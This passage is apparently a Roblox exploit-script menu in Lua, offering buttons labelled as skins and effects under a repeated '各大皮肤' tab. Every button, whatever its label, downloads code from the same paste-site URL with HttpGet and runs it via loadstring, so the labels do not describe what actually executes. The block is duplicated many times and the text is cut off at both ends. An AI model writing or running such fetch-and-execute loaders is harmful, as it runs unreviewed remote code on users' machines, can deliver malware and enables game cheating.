    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
